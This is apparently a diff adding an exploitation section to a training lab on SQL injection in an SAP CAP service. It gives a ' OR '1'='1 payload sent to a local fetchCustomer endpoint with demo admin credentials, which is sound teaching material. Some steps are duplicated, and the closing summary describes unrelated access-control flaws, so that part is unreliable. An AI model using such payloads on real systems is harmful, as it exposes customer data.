@@ -92,3 +92,130 @@ Copy the contents of [services.js](./services_vulnerable.js) into your project�
 - ❌ **No Input Validation:** The user-supplied customerID is concatenated directly into the SQL query without validation, making it possible for an attacker to inject malicious SQL code.
 - ❌ **Lack of Parameterized Queries:** The raw SQL query does not use parameter binding or prepared statements, leaving the query structure exposed to manipulation.
 
+## 💥 3. Exploitation (TBD with screenshots)
+
+### Step 1: Create a Test File for HTTP Endpoint:
+- Action :
+  - Navigate to the `test/http` directory in your CAP project folder.
+  - Click on "Add New File" and name it "sql-injection-demo.http".
+  - Paste the following content into the file "sql-injection-demo.http":
+  
+  ```
+  @server=http://localhost:4004
+  @username=incident.support@tester.sap.com // admin role
+  @password=initial
+  
+  ### Step 1: Legitimate Customer Lookup
+  ### Action: Normal request with valid customer ID
+  ### Expected: Returns single customer record
+  ### Result: System returns data for customer ID 1004100
+  GET {{server}}/odata/v4/admin/fetchCustomer
+  Content-Type: application/json
+  Authorization: Basic {{username}}:{{password}}
+  
+  {
+    "customerID": "1004100"
+  }
+  
+  ### Step 2: SQL Injection Tautology Attack
+  ### Action: Inject malicious payload ' OR '1'='1
+  ### Expected: Returns ALL customer records
+  ### Result: Full database exposure vulnerability
+  GET {{server}}/odata/v4/admin/fetchCustomer
+  Content-Type: application/json
+  Authorization: Basic {{username}}:{{password}}
+  
+  {
+    "customerID": "1004100' OR '1'='1"
+  }
+  
+  ``` 
+  Copy the contents of [sql-injection-demo.http](../../test/http/sql-injection-demo.http) into your project’s test/http/sql-injection-demo.http file.
+
+- Result:
+  - The test/http/sql-injection-demo.http file is now created and ready for testing.
+  - This file contains two HTTP requests:
+    - Step 1: A legitimate request to fetch a specific customer.
+    - Step 2: A malicious request demonstrating SQL injection vulnerability.
+
+### Step 2: Exploit the SQL Injection Vulnerability:
+
+- Action :
+  - Navigate to the `test/http` directory in your CAP project folder.
+  - Click on "Add New File" and name it "sql-injection-demo.http".
+  - Paste the following content into the file "sql-injection-demo.http":
+  
+  ```
+  @server=http://localhost:4004
+  @username=incident.support@tester.sap.com // admin role
+  @password=initial
+  
+  ### Step 1: Legitimate Customer Lookup
+  ### Action: Normal request with valid customer ID
+  ### Expected: Returns single customer record
+  ### Result: System returns data for customer ID 1004100
+  GET {{server}}/odata/v4/admin/fetchCustomer
+  Content-Type: application/json
+  Authorization: Basic {{username}}:{{password}}
+  
+  {
+    "customerID": "1004100"
+  }
+  
+  ### Step 2: SQL Injection Tautology Attack
+  ### Action: Inject malicious payload ' OR '1'='1
+  ### Expected: Returns ALL customer records
+  ### Result: Full database exposure vulnerability
+  GET {{server}}/odata/v4/admin/fetchCustomer
+  Content-Type: application/json
+  Authorization: Basic {{username}}:{{password}}
+  
+  {
+    "customerID": "1004100' OR '1'='1"
+  }
+  
+  ``` 
+  Copy the contents of [sql-injection-demo.http](../../test/http/sql-injection-demo.http) into your project’s test/http/sql-injection-demo.http file.
+
+- Result:
+  - The test/http/sql-injection-demo.http file is now created and ready for testing.
+  - This file contains two HTTP requests:
+    - Step 1: A legitimate request to fetch a specific customer.
+    - Step 2: A malicious request demonstrating SQL injection vulnerability.
+
+### Step 2: Exploit the SQL Injection Vulnerability
+
+- Action:
+  - Open the `sql-injection-demo.http` file in your editor.
+  - Confirm in your `package.json` file that the user `incident.support@tester.sap.com` is assigned the `admin` role under the `cds.requires.[development].auth.users` configuration.
+  - Navigates to a function in ###Step2 that looks up customer information and click on send request.
+  
+    ``` 
+    ### Step 2: SQL Injection Tautology Attack
+    ### Action: Inject malicious payload ' OR '1'='1
+    ### Expected: Returns ALL customer records
+    ### Result: Full database exposure vulnerability
+    GET {{server}}/odata/v4/admin/fetchCustomer
+    Content-Type: application/json
+    Authorization: Basic {{username}}:{{password}}
+    
+    {
+      "customerID": "1004100' OR '1'='1"
+    }
+
+    ```
+
+### 📌Critical Vulnerability Summary
+- ❌ Support users can close high-urgency incidents.
+- ❌ Admins are excluded entirely from modifying closed incidents due to misconfigured @requires.
+- ❌ No validation in services.js for:
+  - Admin role when closing high-urgency incidents.
+  - Admin role when modifying closed incidents.
+- ❌ Silent errors for admins reduce transparency and hinder operations.
+
+
+
+
+
+
+
